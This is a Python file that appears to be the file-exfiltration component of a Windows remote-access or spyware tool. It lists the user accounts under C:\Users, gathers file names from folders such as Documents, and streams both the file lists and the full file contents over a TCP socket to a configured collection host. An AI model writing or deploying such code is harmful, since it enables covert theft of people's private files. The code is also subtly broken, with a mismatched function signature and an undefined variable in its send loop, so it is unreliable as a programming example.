from os import path, listdir
from glob import glob
import socket
from pickle import dumps
import threading
CONN_HOST = "127.0.0.2"
CONN_PORT = 65433 

def getuser(): # Get all users from C:\Users\
    return [path.basename(x) for x in glob('C:\\Users\\*') if x not in ['C:\\Users\\Public', 'C:\\Users\\All Users', 'C:\\Users\\Default', 'C:\\Users\\Default User', 'C:\\Users\\desktop.ini']]

def getfiles(scan_user: str, dict_files: str):
    return [path.basename(x) for x in glob('C:\\Users\\'+scan_user+'\\'+dict_files+'\\*') if '.lnk' not in x]


# Created threads for each function cuz CLI wouldnt work without it
def start_FolderData(fol: str):
        keyThread = threading.Thread(target=lambda: sendFolderData(fol))
        keyThread.daemon = True
        keyThread.start()

def start_sendFiles(filedir: str, filename: str):
        keyThread = threading.Thread(target=lambda: sendFiles(filedir, filename))
        keyThread.daemon = True
        keyThread.start()


def sendFolderData(fol: str):
    users = getuser()
    try:
        #! This should seperate the folder name from the command
        folder = fol.split('-')[2]
        local_files = getfiles(users[1], f"{folder}")
    except:
        try:
            local_files = getfiles(users[1], "Documents")
        except:
            local_files = getfiles(users[0], "Dokumenty")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as suck:
        suck.connect((CONN_HOST, CONN_PORT))
        print("File transfer socket connected.")
        suck.send(dumps(users))
        suck.send(dumps(local_files)) # Server have to use loads(data) from pickle library
    suck.close()
    print("Closed File Transfer socket.")

def sendFiles(filedir: str):
    folder = filedir.split('-')[2]
    print("Got filedir name")
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as suck:
        suck.connect((CONN_HOST, CONN_PORT))
        print("Connected socket")
        for filename in listdir(filedir): # Get each file in folder
            suck.send(filename.encode("utf-8")) # Send file name and type
            print("Got filename: ", filename)
            dict_files = open("C:\\Users\\" + getuser()[0] + "\\" + folder + "\\" + filename, "rb")
            print("Got file dir: ", dict_files)
            file_line = dict_files.read(1024)
            while(file_line):
                suck.send(line)
                line = dict_files.read(1024)
            suck.send(b"Finished Sending DATA!")
            dict_files.close()
            print("Data sent")
    print("Transfer Finished")
    suck.close()
